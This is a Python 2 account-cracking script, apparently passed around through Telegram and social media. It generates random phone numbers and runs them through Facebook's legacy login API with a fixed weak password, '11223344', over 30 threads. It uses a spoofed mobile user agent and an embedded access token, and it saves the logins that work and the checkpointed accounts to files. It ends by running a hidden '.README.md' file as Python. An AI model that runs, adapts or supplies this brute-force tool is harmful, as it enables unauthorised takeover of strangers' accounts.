#COD BY: EMRAN
#TELEGRAM: i4m_maro
#CHANNAL: EMRAN KING

#edite bka balam male he xoma wa agar ba para befroshetawa sukt akam 

#edite bka balam male he xoma wa agar ba para befroshetawa sukt akam 

#edite bka balam male he xoma wa agar ba para befroshetawa sukt akam 
#edite bka balam male he xoma wa agar ba para befroshetawa sukt akam 
#edite bka balam male he xoma wa agar ba para befroshetawa sukt akam 

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(20000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print '[!] Exit'
	os.sys.exit()

def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### LOGO #####
logo ='''
.
 /$$$$$$$$                                           
| $$_____/                                           
| $$       /$$$$$$/$$$$   /$$$$$$  /$$$$$$  /$$$$$$$ 
| $$$$$   | $$_  $$_  $$ /$$__  $$|____  $$| $$__  $$
| $$__/   | $$ \ $$ \ $$| $$  \__/ /$$$$$$$| $$  \ $$
| $$      | $$ | $$ | $$| $$      /$$__  $$| $$  | $$
| $$$$$$$$| $$ | $$ | $$| $$     |  $$$$$$$| $$  | $$
|________/|__/ |__/ |__/|__/      \_______/|__/  


--------------------------------------------------
 \033[1;33m
Auther   : MARO
\033[1;31m
Telegram : i4m_maro
\033[2;31m
Channel  : TEAM_1668
\033[1;34m
Instagram: dido_cracker1668
\033[2;35m
Snapchat : dido_cracker24
 \033[2;32m
TIKTOK   : dido_cracker_1668
--------------------------------------------------
                                '''

back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
	os.system('clear')
	print logo
	print '[1]  Random Mobile Number (maro_Cracker)'
	print '[0]  Exit            '
	print 50*'-'
	action()


def action():
	bch = raw_input('\n ==  ')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		print('\033[1;32m                       Crack krdn ba raqam \033[0m')
		try:
			k = raw_input(" raqamy wlat : ")
			c = raw_input (" yakame raqamaka : ")
			binni = raw_input (" zhmara talafwn  : ")
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =='0':
		exb()
	else:
		print '[!] Fill in correctly'
		action()

	xxx = str(len(id))
	print ' '
	psb (' Total Mobile Numbers: '+xxx)
	time.sleep(0.5)
	psb (' Brute Force Has been Started')
	time.sleep(0.5)
	print 50*'-'
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = "11223344"
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[Successfull] ' + k + c + user + '  ' + pass1 + '\x1b[0m'
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '[Check-point] ' + k + c + user + '  ' + pass1
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
#				else:
#				    pass2="1234512345"
#				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
#				    q = json.load(data)
#				    if 'access_token' in q:
#				        print '\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass2+'\n'+"\n"
#				        okb = open('save/successfull.txt', 'a')
#				        okb.write(k+c+user+'|'+pass2+'\n')
#				        okb.close()
#				        oks.append(c+user+pass2)
#				    else:
#				        if 'www.facebook.com' in q['error_msg']:
#					        print '[Checkpoint] ' + k + c + user + ' | ' + pass2+'\n'
#					        cps = open('save/checkpoint.txt', 'a')
#					        cps.write(k+c+user+'|'+pass2+'\n')
#					        cps.close()
#					        cpb.append(c+user+pass2)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*'-'
	print ' Process Has Been Completed ....'
	print ' Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print(' CP File Has Been Saved : save/checkpoint.txt')
	raw_input('\n[Press Enter To Go Back]')
	os.system('python2 .README.md')
		
if __name__ == '__main__':
	menu()

